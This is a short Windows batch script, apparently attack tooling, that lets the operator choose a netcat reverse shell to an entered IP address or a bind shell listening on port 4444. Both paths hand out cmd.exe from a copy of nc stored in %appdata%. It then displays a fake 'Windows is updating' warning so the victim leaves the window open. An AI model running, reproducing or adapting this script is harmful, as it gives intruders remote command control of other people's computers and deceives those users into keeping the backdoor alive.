cls

@echo off

Choice /C yn /M "[Y] Reverse Shell [N] TCP Bind :Both port 4444:"
If Errorlevel 2 Goto No


If Errorlevel 1 Goto Yes

Goto End
:No
%appdata%\nc -l -p 4444 -e cmd.exe


Goto End
:Yes
set /P id=Enter IP Address: 
%appdata%\nc -nv %id% 4444 -e cmd.exe
cls
echo ::WARNING:: Windows is updating, please do not close this file :: 90 percent ::
pause




    